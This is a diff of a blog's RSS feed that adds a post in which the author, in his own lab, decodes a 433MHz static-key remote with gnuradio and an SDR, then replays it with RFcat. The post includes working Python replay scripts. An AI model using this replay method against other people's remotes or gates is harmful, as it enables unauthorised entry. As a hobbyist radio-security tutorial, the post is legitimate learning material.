@@ -6,8 +6,494 @@
     <description>Recent content in Posts on #!/slash/note</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 09 Jul 2016 15:55:48 +0200</lastBuildDate>
+    <lastBuildDate>Sun, 02 Oct 2016 16:05:22 +0200</lastBuildDate>
     <atom:link href="https://leonjza.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>reverse engineering static key remotes with gnuradio and rfcat</title>
+      <link>https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/</link>
+      <pubDate>Sun, 02 Oct 2016 16:05:22 +0200</pubDate>
+      
+      <guid>https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/</guid>
+      <description>
+
+&lt;p&gt;At &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-index.html&#34;&gt;defcon24&lt;/a&gt; this year, I impulsively bought myself some new toys. Amongst what I got included a &lt;a href=&#34;https://greatscottgadgets.com/yardstickone/&#34;&gt;YARD Stick One&lt;/a&gt; and a &lt;a href=&#34;https://greatscottgadgets.com/ubertoothone/&#34;&gt;Ubertooth One&lt;/a&gt;. I already owned a DVB-T dongle much like &lt;a href=&#34;https://www.amazon.co.uk/Digital-DVB-T-RTL2832U-FC0013B-Receiver/dp/B00NOP0P6W&#34;&gt;this one&lt;/a&gt; that I bought at defcon23 the previous year.&lt;/p&gt;
+
+&lt;p&gt;My interest in Software Defined Radio has long been one of those where I just felt so overwhelmed with the idea for a very long time that I dare not try it. This, together with the fact that its something I &lt;em&gt;totally&lt;/em&gt;  know nothing about really did make for this bit of research to be pretty daunting at first.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_banner.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Nonetheless, here is my adventure into reverse engineering a plain static key remote and successfully replaying it from my computer.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-terminology&#34;&gt;the terminology&lt;/h2&gt;
+
+&lt;p&gt;Where to start? In hindsight, I guess a sane point of departure would have been to first figure out what all of these new acronyms mean. OOK, PWM, AM, FSK etc were all things I have only seen but never actually knew what they meant. I read a whole bunch of blog posts and other RTL-SDR related stuff, thinking I could just dive right in. It was not long before I realized that its pretty important when someone talks about Pulse Width Modulation(PWM) that I &lt;strong&gt;actually&lt;/strong&gt; know that this means!&lt;/p&gt;
+
+&lt;p&gt;So, as I progressed through the resources I found online, I made a note of looking up the acronyms and what the general idea behind them were. The most important of the acronyms you should know is listed below. You should seriously take some time to look into these in more detail and not just rely on my silly descriptions:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;AM&lt;/strong&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/Amplitude_modulation&#34;&gt;Amplitude Modulation&lt;/a&gt;&lt;br /&gt;
+When talking &lt;strong&gt;AM&lt;/strong&gt;, we are referring to the fact that the signal strength (or amplitude) is varied according to the waveform that is being transmitted. &lt;a href=&#34;https://upload.wikimedia.org/wikipedia/commons/a/a4/Amfm3-en-de.gif&#34;&gt;This gif&lt;/a&gt; shows a comparison between &lt;strong&gt;AM&lt;/strong&gt; and &lt;strong&gt;FM&lt;/strong&gt; (Frequency Modulation) for the same signal. It should be clear that for the same signal, &lt;strong&gt;AM&lt;/strong&gt; increases the amplitude of the waveform, and &lt;strong&gt;FM&lt;/strong&gt; increases the frequency of the waveform&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;PWM&lt;/strong&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/Pulse-width_modulation&#34;&gt;Pulse Width Modulation&lt;/a&gt;&lt;br /&gt;
+In addition to &lt;strong&gt;AM&lt;/strong&gt;, in the case of these static key remotes, they make use of &lt;strong&gt;PWM&lt;/strong&gt;. Basically, the duration of a pulse determines the bit that is being send. A long pulse is a zero, and a short pulse is a one.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;OOK&lt;/strong&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/On-off_keying&#34;&gt;On-off keying&lt;/a&gt;&lt;br /&gt;
+On-off keying is a form of &lt;a href=&#34;https://en.wikipedia.org/wiki/Amplitude-shift_keying&#34;&gt;Amplitude-shift keying&lt;/a&gt; where a binary value is represented based on the duration of the presence of a carrier signal (or a just a high amplitude signal).&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;the-gear&#34;&gt;the gear&lt;/h2&gt;
+
+&lt;p&gt;Once I had a good idea of what all of this stuff means, it was time to get some gear to play with. I went to a local &lt;a href=&#34;http://www.communica.co.za/&#34;&gt;electronics store&lt;/a&gt; to pick up a few things. The most important being a static key remote. I also needed something that will &lt;em&gt;switch on&lt;/em&gt; when the remote is pressed. For this, I settled on a small LED light, just to give an indication of life. All in all I must have spent close to R600 (~40USD) for everything. The list of lab toys included:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P3842375875&#34;&gt;Basic 433Mhz Binary Code Transmitter&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P4011845900&#34;&gt;12V Power Supply&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P3225790564&#34;&gt;Generic, Static Key Receiver&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P2952215568&#34;&gt;10W LED Light&lt;/a&gt; &lt;strong&gt;(wow this thing is bright!)&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P2750472738&#34;&gt;Enclosure&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Some wiring etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I setup, wired together and tested everything. The LED light was wired up to the normally open contact so that when the remote button is pressed, the light will go on for a brief period of time and then switch off.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_lab_gear.jpg&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I paired my remote with a random position of the 12 dip switches on it to the receiver and tested that the light actually goes on under normal conditions. Sweet.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-signal-capture&#34;&gt;the signal capture&lt;/h2&gt;
+
+&lt;p&gt;Capturing the remotes signal turned out to be a little easier than I initially expected. I found &lt;strong&gt;plenty&lt;/strong&gt; of resources online that helped me get familiar with ways to do it. The most common capture method I could see was to use a tool called &lt;a href=&#34;http://gqrx.dk/&#34;&gt;GXRQ&lt;/a&gt;. GQRX allows you to tune into the frequency and make a raw recording of the signal to file. This is probably the fastest way to get the recordings to file. The recorded file can then be opened up in &lt;a href=&#34;http://gnuradio.org/&#34;&gt;gnuradio&lt;/a&gt; or &lt;a href=&#34;https://github.com/miek/inspectrum&#34;&gt;inspectrum&lt;/a&gt;. You can do a number of fun things with GQRX, like listening to radio! (I had to enable Hardware AGC in GQRX for this to work) :)&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_fm_radio.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Anyways. I got stuck trying to decode the key from the remote using GQRX recording. No matter how I loaded it into inspectrum or audacity (or even raw parsing attempts at some stage), I just could not make head or tail of what I was looking at. In fact, it all just turned out to be garbage to me. Maybe because I didn&amp;rsquo;t set it to record AM? Who knows. Anyways.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-gnuradio-reveal&#34;&gt;the gnuradio reveal&lt;/h2&gt;
+
+&lt;p&gt;Speaking to &lt;a href=&#34;https://twitter.com/elasticninja&#34;&gt;@elasticninja&lt;/a&gt; (&lt;em&gt;thanks for your epic patience dude!&lt;/em&gt;), I got tipped off to an absolutely &lt;strong&gt;great&lt;/strong&gt; video by &lt;a href=&#34;https://twitter.com/michaelossmann&#34;&gt;Michael Ossmann&lt;/a&gt; in he&amp;rsquo;s &lt;em&gt;Software Defined Radio with HackRF&lt;/em&gt; series &lt;a href=&#34;https://greatscottgadgets.com/sdr/&#34;&gt;here&lt;/a&gt;. More specifically, &lt;a href=&#34;https://greatscottgadgets.com/sdr/8/&#34;&gt;lesson 8&lt;/a&gt; deals with on-off keying and was excellent in getting me started with gnuradio.&lt;/p&gt;
+
+&lt;p&gt;This lesson does a great job of showing you how to find out more details about a specific remote that you are interested in by looking up its hardware specs, test results and any other pieces of information. It then goes on to explain how to get your first flow graph up and running in gnuradio in no time.&lt;/p&gt;
+
+&lt;h2 id=&#34;preparing-gnuradio&#34;&gt;preparing gnuradio&lt;/h2&gt;
+
+&lt;p&gt;Before building gnuradio flow graphs, a little bit of preparation was needed. I was using a Kali Virtual Machine in VMWare for testing and had to install a few extra packages on top of the base installation. While we on the topic of dependencies, I am just going to list everything needed to replicate that which you will find in this post:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;apt install gnu-radio rfcat gr-osmosdr audacity
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you want audio to work, I had to enable pulseaudio with these commands followed by a reboot:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;systemctl --user enable pulseaudio &amp;amp;&amp;amp; systemctl --user start pulseaudio
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With that out of the way, I was ready to replicate that flow graph from the lesson.&lt;/p&gt;
+
+&lt;h2 id=&#34;building-the-flow-graph&#34;&gt;building the flow graph&lt;/h2&gt;
+
+&lt;p&gt;Just like the session explained, I launched &lt;code&gt;gnuradio-companion&lt;/code&gt; and built the flow graph the same way:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Launch GNU radio (and start a new WX GUI Graph). I noticed it defaults to the QT GUI in the options block, so just right-click edit that and flip it over to WX GUI.&lt;/li&gt;
+&lt;li&gt;Add a new &lt;em&gt;osmocom Source&lt;/em&gt; block to receive data from your RTL-SDR. If you cant find the block, click on any item on the list on the right and hit &lt;em&gt;ctrl-f&lt;/em&gt; to filter.&lt;/li&gt;
+&lt;li&gt;Add a new &lt;em&gt;WX GUI FFT Sink&lt;/em&gt; and connect the &lt;em&gt;osmocon Source&lt;/em&gt; and new FFT sink by clicking on the output and input of each.&lt;/li&gt;
+&lt;li&gt;Set a higher sample rate of 2000000 in the &lt;code&gt;samp_rate&lt;/code&gt; variable by editing the &lt;em&gt;Variable&lt;/em&gt; block.&lt;/li&gt;
+&lt;li&gt;Edit the &lt;em&gt;osmocon Source&lt;/em&gt; block and set the RF Gain to 0 and the frequency to the one you are hoping to listen in on. In my case this is 4339e5, or 4339200000.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Once this is done, save the flow graph and run it (with your RTL-SDR plugged in) to visualize the signal when you press your remote!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_gnu_radio1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Fast forward a bit through the lesson, and we finally get to part where we can visualize the key on the remote as a demodulated waveform with the addition of the second scope sink (around 30mins in). To get a nice and clear picture of the on-off keying, we want to measure the magnitude over time of a sample. This can be done by adding a type converter to the flow graph. The &lt;em&gt;Complex to Mag&lt;/em&gt; type converter will do the job just fine. To add this:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Find the type converter block called &lt;em&gt;Complex to Mag&lt;/em&gt; and drag it onto the flow graph.&lt;/li&gt;
+&lt;li&gt;Connect the output from the &lt;em&gt;osmocon Source&lt;/em&gt; to the &lt;em&gt;Complex to Mag&lt;/em&gt; input.&lt;/li&gt;
+&lt;li&gt;Connect the output of the &lt;em&gt;Complex to Mag&lt;/em&gt; converter to the Scope sink input.&lt;/li&gt;
+&lt;li&gt;Change the input expected by the scope sink from &lt;em&gt;complex&lt;/em&gt; to &lt;em&gt;float&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;With this done, run the graph again. You will need to fiddle a little with the seconds per division and counts per division values to get the visualization just right. Unticking the &lt;em&gt;Autorange&lt;/em&gt; box will also greatly help you narrow down the signal. As a last tip, if you experience the graph jumping around too much (from left to right), you can toggle a &amp;lsquo;center&amp;rsquo; by focussing the &lt;em&gt;Trig&lt;/em&gt; tab and setting the lines that appear with the level toggles.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_demodulated_scope.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;As you can see in this screenshot, the keying seems to represent the values:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[short, short, short, long, long, short, short, long, short, short, long, short]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This indeed matches the switch positions on my remote. Yay!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_real_remote.jpg&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;storing-the-recordings&#34;&gt;storing the recordings&lt;/h2&gt;
+
+&lt;p&gt;Looking at those waveforms is cool and all, but it isn&amp;rsquo;t always practical to keep your finger on a button. Instead, we can record the output to a file for later use. You may choose to record the raw, unprocessed signal from the radio (in cases where you may need to still do some processing on the file maybe?) or save the demodulated waveform. To do this, simply add a new &lt;em&gt;Wave File Sink&lt;/em&gt; block after the &lt;em&gt;Complex to Mag&lt;/em&gt; block and specify a destination filename.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_wave_file_sink.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Now, just launch the graph and press down on the remote for a while. When done, stop the graph and check if your file has been written in the location you specified:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~ # ls -lah remote.wav
+-rw-r--r-- 1 root root 7.2M Oct  3 22:07 remote.wav
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great. If you need to re-use this file at a later stage in gnuradio, simply add a &lt;em&gt;File Source&lt;/em&gt; / &lt;em&gt;Wave File Source&lt;/em&gt; block as needed and reconnect the other blocks where appropriate.&lt;/p&gt;
+
+&lt;h2 id=&#34;viewing-in-audacity&#34;&gt;viewing in audacity&lt;/h2&gt;
+
+&lt;p&gt;If you saved the demodulated wave file, then you can open this file in &lt;a href=&#34;http://www.audacityteam.org/&#34;&gt;Audacity&lt;/a&gt;. Simply launch audacity (we already installed it) and open the recorded wave file. Viewing the recording at first may look something like this:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_full.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;However, when you zoom in a little, you may start seeing the on-off keying becoming obvious:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_zoomed.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Admittedly, getting this far was relatively easy thanks to the ton of research out there already!&lt;/p&gt;
+
+&lt;h2 id=&#34;introducing-rfcat&#34;&gt;introducing rfcat&lt;/h2&gt;
+
+&lt;p&gt;I guess the main reason why I decided on the YARD Stick One was because of the fact that it comes pre-flashed with the &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RFcat&lt;/a&gt; firmware. It was only after the fact that I realized its actually a &lt;a href=&#34;https://greatscottgadgets.com/yardstickone/&#34;&gt;pretty good RF device in general&lt;/a&gt;. There are some other radios (maybe cheaper?) that you can flash to work with RFCat such as the &lt;a href=&#34;http://www.ti.com/tool/cc1111emk868-915&#34;&gt;CC1111emk&lt;/a&gt; dongle or the dongle that comes with the &lt;a href=&#34;http://www.ti.com/tool/ez430-chronos&#34;&gt;Chronos watch development kit&lt;/a&gt;. The &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat/wiki/SupportedDongles&#34;&gt;RFCat wiki&lt;/a&gt; also has a list of compatible dongles.&lt;/p&gt;
+
+&lt;p&gt;As for RFcat itself, I guess the most important thing to realize is that you effectively have a python interface to the underlying radio when using it. Admittedly, there isn&amp;rsquo;t a lot of documentation for RFCat and you may very quickly come to realize that you will have to make use of the &lt;code&gt;help()&lt;/code&gt; strings and the source code of &lt;code&gt;rflib&lt;/code&gt; to learn the necessary. This coupled with existing projects and work online doesn&amp;rsquo;t make it &lt;em&gt;too hard&lt;/em&gt; to get going.&lt;/p&gt;
+
+&lt;p&gt;To give you an idea, below is a sample snippet of starting &lt;code&gt;rfcat&lt;/code&gt; in &lt;em&gt;&amp;lsquo;research&amp;rsquo; (-r)&lt;/em&gt; mode and sending a string as a &amp;lsquo;ping&amp;rsquo; packet. Using RFcat this way, the object &lt;code&gt;d&lt;/code&gt; is used to call methods for the radio:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_rfcat_ping.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;As you can see in the screenshot, there is a banner message giving you some useful hints on how you can interact with the dongle. Methods such as &lt;code&gt;setFreq()&lt;/code&gt;, &lt;code&gt;setMdmModulation()&lt;/code&gt; etc is all things we will be needing soon™ when we want to start replaying the signal of this remote (and switch on that very bright LED!).&lt;/p&gt;
+
+&lt;h2 id=&#34;sending-the-signal-with-rfcat&#34;&gt;sending the signal with RFcat&lt;/h2&gt;
+
+&lt;p&gt;As you may have noticed by now, sending signals with RFCat is as simple as &lt;code&gt;d.RFxmit(data=&#39;DEADBEEF&#39;)&lt;/code&gt;. To get the receiver to understand my replay, I didn&amp;rsquo;t think it would be as easy just playing the raw binary string of &lt;code&gt;111001101101&lt;/code&gt; back. I tested anyways by writing a small script to start sending signals and then captured them using my SDR and gnuradio. The values for the frequency and baud rate is something that you &lt;em&gt;should&lt;/em&gt; be able to get from the data sheets of the remote you are attempting to replay. (I will show you how to calculate the baud rate later though). The original script I used was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
+
+import rflib
+
+d = rflib.RfCat()
+
+# Set Modulation. We using On-Off Keying here
+d.setMdmModulation(rflib.MOD_ASK_OOK)
+
+d.makePktFLEN(12)    # Set the RFData packet length
+d.setMdmDRate(3800)  # Set the Baud Rate
+d.setMdmSyncMode(0)  # Disable preamble
+d.setFreq(433920000) # Set the frequency
+
+d.RFxmit(&#39;111001101101&#39;)
+d.setModeIDLE()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I ran this script together with a gnuradio flow graph that was set up to dump the signal to a file. I then used this signal as a source to a &lt;em&gt;Scope Sink&lt;/em&gt; that was prefixed with a &lt;em&gt;Complex to Mag&lt;/em&gt; block. As expected, with this initial attempt I could not find anything in my graphs that even remotely looked like on-off keying!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_raw_binary_xmit.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;No easy win here was ok as it forced me to dive a little into the RFCat source code in an attempt to figure out how exactly the data should be sent. I also searched online for examples of how to send data correctly and came across a number of examples to help me.&lt;/p&gt;
+
+&lt;p&gt;Turns out, I need to get my data into bytes to send with &lt;code&gt;RFxmit()&lt;/code&gt;. No big deal, lets do just that!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
+
+import rflib
+
+data = &#39;111001101101&#39;
+
+# Convert the data to hex
+rf_data = hex(int(data, 2))
+
+d = rflib.RfCat()
+
+# Set Modulation. We using On-Off Keying here
+d.setMdmModulation(rflib.MOD_ASK_OOK)
+
+d.makePktFLEN(len(rf_data)) # Set the RFData packet length
+d.setMdmDRate(3800)         # Set the Baud Rate
+d.setMdmSyncMode(0)         # Disable preamble
+d.setFreq(433920000)        # Set the frequency
+
+# Send the data string a few times
+d.RFxmit(rf_data, repeat=500)
+
+d.setModeIDLE()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I now added the hex conversation of the original binary string and added the &lt;code&gt;repeat=500&lt;/code&gt; value to &lt;code&gt;RFxmit()&lt;/code&gt; to help me find the signal with gnuradio. This was finally what I needed to be able to send data that appeared to look like on-off keying!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_non_pwm_gnuradio.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This was not exactly the same as the signal that I originally captured using the actual remote, but, it was progress, and I believed it to be &lt;strong&gt;good&lt;/strong&gt; progress.&lt;/p&gt;
+
+&lt;h2 id=&#34;getting-the-on-off-keying-right&#34;&gt;getting the on-off keying right&lt;/h2&gt;
+
+&lt;p&gt;I played around quite a bit at this stage with my attempts to represent the same waveform as the ones captured from the remote I am trying to replicate. I made a major breakthrough when I came across this &lt;a href=&#34;http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html&#34;&gt;blog post&lt;/a&gt; where the author explains a method in which to accurately convert the signal into a true on-off keying waveform. The general idea being that you should take note of the smallest distance of amplitude and use that as a single binary digit. You then count the bits relative to this distance and convert to them to a &lt;code&gt;1&lt;/code&gt; for a high amplitude and a &lt;code&gt;0&lt;/code&gt; for a low amplitude. Effectively we are simply calculating the Pulse-width Modulation key for our binary code manually now.&lt;/p&gt;
+
+&lt;p&gt;So to replicate this in my example, I went back to the original wave file I recorded and extracted a single full pulse.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_full_zoom.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;One important difference that I noticed with my remote compared to many similar posts I saw online was that I had this long starting high amplitude before the actual on-off keying signal started. It looked like about half of a pulse was this high amplitude, and the other half signal. I assumed these will all just be handled by adding a bunch of &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s in front of my final key as it may have served as some form of preamble or something. ¯\_(ツ)_/¯&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_full_zoom_pwm.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;If you look closely at the above image, you would notice that the second half of the pulse is divided up into equal length sections that are of similar size as that of the smallest pulse. This size can be seen as the &lt;a href=&#34;https://en.wikipedia.org/wiki/Clock_signal&#34;&gt;clock signal&lt;/a&gt;. The distance of a high pulse followed by a low pulse (relative to the clock signal) signify the bits that is being transferred. This is actually also known as &lt;a href=&#34;https://en.wikipedia.org/wiki/Pulse-width_modulation#Telecommunications&#34;&gt;Pulse-width Modulation&lt;/a&gt;. Applying this logic (as shown in the screenshot where the bits are filled in) to the waveform, we can deduce that the Pulse-width Modulation key (without the prefix of the 35x&lt;code&gt;1&lt;/code&gt;&amp;rsquo;s and the &lt;code&gt;0&lt;/code&gt;) is:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;100100100110110100100110100100110100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we take an even closer look at the above PWM key, one might even notice that in relation to the waveform, the bit strings &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s and &lt;code&gt;0&lt;/code&gt;&amp;rsquo;s are represented as &lt;code&gt;100&lt;/code&gt; for a &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;110&lt;/code&gt; for a &lt;code&gt;0&lt;/code&gt; to form the full PWM key. We can visualize this logic in the below snippet where the PWM key is separated by a | and the original bitstring is filled in below it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;100 | 100 | 100 | 110 | 110 | 100 | 100 | 110 | 100 | 100 | 110 | 100
+ 1     1     1     0     0     1     1     0     1     1     0     1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This matches our initial bit string of &lt;code&gt;111001101101&lt;/code&gt;, and helps us conclude that for a full PWM key (with the leading bunch of &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s) the resultant key would be:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;111111111111111111111111111111111110100100100110110100100110100100110100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;baud-rate-hate&#34;&gt;baud rate hate&lt;/h2&gt;
+
+&lt;p&gt;Before I get to the rest of the newly updated script, lets talk about &lt;a href=&#34;https://en.wikipedia.org/wiki/Baud&#34;&gt;baud rate&lt;/a&gt; quickly. This is something that caused me &lt;strong&gt;a lot&lt;/strong&gt; of pain. I managed to get the original waveform from my remote and my generated waveform using scripts to look similar, but there was a serious issue with getting the length of the pulses to match. &lt;em&gt;If you look closely at the below screenshot you will notice there is actually a problem with the key too (missing a bit), but heh, the clock signal is whats important here:&lt;/em&gt;&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_baud_rate_miss.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This problem existed until I finally managed to figure out what the math for the baud rate calculation was. I noticed that this value is not an exact science though. You can be off by &lt;em&gt;quite a lot&lt;/em&gt;, and yet the signal will still have a high change of succeeding. YMMV.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately I can not remember the post / code that lead me to this, but the basic idea for calculating baud rate is as follows:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The source wave file would have been recorded at a certain &lt;em&gt;Sample Rate&lt;/em&gt;. We recorded at a sample rate of 2M from gnuradio.&lt;/li&gt;
+&lt;li&gt;We want to figure out how many samples makes up the distance of the shortest high aptitude in the pulse (much like we needed for the PWM key calculation)&lt;/li&gt;
+&lt;li&gt;The number of samples in the shortest high amplitude bit, divided by the sample rate over 1 should give you the baud rate.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In other words:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;baud = (1.0 / (length of shortest high peak / sample rate))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Practically, you can determine the values needed for the formula by opening a wave file you recorded using gnuradio, zooming and selecting one of the short pulses and changing the selection at the bottom dropdown to &lt;em&gt;length and samples&lt;/em&gt;.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_baud_rate.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Here you can see my sample range for the shortest high peak is &lt;strong&gt;740&lt;/strong&gt; samples, and on the far left you can see the sample rate of &lt;strong&gt;2000000&lt;/strong&gt;. That means that my baud rate will be &lt;code&gt;1.0/(740/2000000)&lt;/code&gt;, which is ~&lt;strong&gt;2702&lt;/strong&gt; baud. Not 100% accurate, but accurate enough to work.&lt;/p&gt;
+
+&lt;h2 id=&#34;let-there-be-light&#34;&gt;let there be light&lt;/h2&gt;
+
+&lt;p&gt;One last hurdle! I had some troubles with the conversions to hex for the long bit string as a result of the PWM conversion. Thankfully, I came across the &lt;a href=&#34;https://pypi.python.org/pypi/bitstring/3.1.3&#34;&gt;bitstring&lt;/a&gt; module to handle the conversion to bytes. What a fantastic library :P.&lt;/p&gt;
+
+&lt;p&gt;The final, updated script follows:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
+
+# Send a PWM String using RfCat
+
+import rflib
+import bitstring
+
+# That prefix string. This was determined by literally
+# just looking at the waveform, and calculating it relative
+# to the clock signal value.
+# Your remote may not need this.
+prefix = &#39;111111111111111111111111111111111110&#39;
+
+# The key from our static key remote.
+key = &#39;111001101101&#39;
+
+# Convert the data to a PWM key by looping over the
+# data string and replacing a 1 with 100 and a 0
+# with 110
+pwm_key = &#39;&#39;.join([&#39;100&#39; if b == &#39;1&#39; else &#39;110&#39; for b in key])
+
+# Join the prefix and the data for the full pwm key
+full_pwm = &#39;{}{}&#39;.format(prefix, pwm_key)
+print(&#39;Sending full PWM key: {}&#39;.format(full_pwm))
+
+# Convert the data to hex
+rf_data = bitstring.BitArray(bin=full_pwm).tobytes()
+
+# Start up RfCat
+d = rflib.RfCat()
+
+# Set Modulation. We using On-Off Keying here
+d.setMdmModulation(rflib.MOD_ASK_OOK)
+
+# Configure the radio
+d.makePktFLEN(len(rf_data)) # Set the RFData packet length
+d.setMdmDRate(2702)         # Set the Baud Rate
+d.setMdmSyncMode(0)         # Disable preamble
+d.setFreq(433920000)        # Set the frequency
+
+# Send the data string a few times
+d.RFxmit(rf_data, repeat=25)
+d.setModeIDLE()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I ran this newly updated script and &lt;strong&gt;BAM&lt;/strong&gt;, my labs LED light illuminates! \o/&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
